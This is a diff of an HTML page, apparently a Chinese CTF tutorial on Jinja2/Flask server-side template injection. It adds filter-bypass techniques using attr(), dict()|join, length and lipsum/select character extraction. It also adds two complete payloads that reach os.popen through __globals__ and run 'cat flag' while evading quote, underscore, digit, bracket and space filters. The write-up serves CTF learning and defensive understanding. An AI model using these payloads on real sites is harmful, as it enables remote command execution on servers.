@@ -486,7 +486,8 @@ code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals_
 </code></pre>
 <h2 id="下划线过滤"><a href="#下划线过滤" class="headerlink" title="下划线过滤"></a>下划线过滤</h2><p>过滤器绕过</p>
 <h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="https://i0.hdslb.com/bfs/article/0099b1d9816f44c228acba8dfc5ea7d0290349942.png"></p>
-<h3 id="attr-绕过"><a href="#attr-绕过" class="headerlink" title="attr()绕过"></a>attr()绕过</h3><pre><code>
+<h3 id="attr-绕过"><a href="#attr-绕过" class="headerlink" title="attr()绕过"></a>attr()绕过</h3><p>attr主要用来防止 <code>.</code>过滤而不能获取对象属性</p>
+<pre><code>
 &#123;&#123;()|attr(request.args.qwq)&#125;&#125;
 
 
@@ -536,11 +537,27 @@ code=&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[117]['
 <p><img src="https://i0.hdslb.com/bfs/article/0df4a188c528a125d2921537266b34c5290349942.png"></p>
 <h2 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h2><h3 id="过滤器length"><a href="#过滤器length" class="headerlink" title="过滤器length"></a>过滤器length</h3><p>length过滤器用于返回字符串长度</p>
 <p><img src="https://i0.hdslb.com/bfs/article/94d9e71bc5f7ebaeb4b1257e35a04a90290349942.png"></p>
-<pre><code>&#123;% set a='aaaaa'|length %&#125;&#123;&#123;a&#125;&#125;        10
+<pre><code>&#123;% set a='aaaaa'|length %&#125;&#123;&#123;a&#125;&#125;        #10
 
-&#123;% set a='aaaaa'|length*'a'|length %&#125;&#123;&#123;a&#125;&#125;          30
+&#123;% set a='aaaaa'|length*'a'|length %&#125;&#123;&#123;a&#125;&#125;          #30
 </code></pre>
-<h2 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h2><h3 id="过滤器dict-和join"><a href="#过滤器dict-和join" class="headerlink" title="过滤器dict()和join"></a>过滤器dict()和join</h3><h1 id="获取config"><a href="#获取config" class="headerlink" title="获取config"></a>获取config</h1><p>无过滤直接<code>&#123;&#123;config&#125;&#125;</code>就可以获取</p>
+<h2 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h2><h3 id="过滤器dict-和join"><a href="#过滤器dict-和join" class="headerlink" title="过滤器dict()和join"></a>过滤器dict()和join</h3><p> <code>join</code>可以直接拼接键名</p>
+<pre><code>
+ &#123;%set a=dict(__cla=a,ss__=a)|join%&#125;&#123;a&#125; 
+</code></pre>
+<h3 id="获取符号"><a href="#获取符号" class="headerlink" title="获取符号"></a>获取符号</h3><pre><code>&#123;%set ben =(&#123;&#125;|select()|string()|list)%&#125;&#123;&#123;ben&#125;&#125;
+</code></pre>
+<p> <img src="https://i0.hdslb.com/bfs/article/af84e2e9dadc2cf4d1a42cb306014bfe290349942.png"></p>
+<p>当加上list就会变成列表就可以<code>[8]</code>等方式获得数据</p>
+<h3 id="过滤-‘-“-request"><a href="#过滤-‘-“-request" class="headerlink" title="过滤 ‘ “ + request . [ ]"></a>过滤 ‘ “ + request . [ ]</h3><pre><code>code=&#123;% set a = dict(__class__=1)|join%&#125;&#123;% set b = dict(__base__=1)|join%&#125;&#123;% set c = dict(__subclasses__=1)|join%&#125;&#123;% set d = dict(__getitem__=1)|join%&#125;&#123;% set f = dict(__init__=1)|join%&#125;&#123;% set g = dict(__globals__=1)|join%&#125;&#123;% set h = dict(popen=1 )|join%&#125;&#123;%set i = (&#123;&#125;|select()|string()|attr(d)(10))%&#125;&#123;% set j = (dict(cat=1)|join,i,dict(flag=1)|join)|join%&#125;&#123;% set a1 = dict(read=1)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(f)|attr(g)|attr(d)(h)(j)|attr(a1)()&#125;&#125;
+</code></pre>
+<p>主要是利用join拼接+addr绕过点，最后执行命令那要绕过单引号，就利用了上面获取符号例子里获取空格</p>
+<h3 id="过滤-‘-“-0-9-空格"><a href="#过滤-‘-“-0-9-空格" class="headerlink" title="过滤 ‘ “ _ 0-9 . [ ] \ 空格"></a>过滤 ‘ “ _ 0-9 . [ ] \ 空格</h3><pre><code>&#123;&#123;lipsum|string|list&#125;&#125;
+</code></pre>
+<p>获取过滤的符号<br>再构造payload</p>
+<pre><code>&#123;% set nine = dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set pop=dict(pop=a)|join%&#125;&#123;%set kg=(lipsum|string|list)|attr(pop)(nine)%&#125;&#123;%set eighteen=nine+nine%&#125;&#123;%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%&#125;&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%&#125;&#123;%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set payload=(dict(cat=cat)|join,kg,dict(flag=flag)|join)|join %&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
+</code></pre>
+<h1 id="获取config"><a href="#获取config" class="headerlink" title="获取config"></a>获取config</h1><p>无过滤直接<code>&#123;&#123;config&#125;&#125;</code>就可以获取</p>
 <p>当被过滤时，可利用已加载内置函数或对象寻找被过滤字符串</p>
 <p>flask内置函数</p>
 <table>
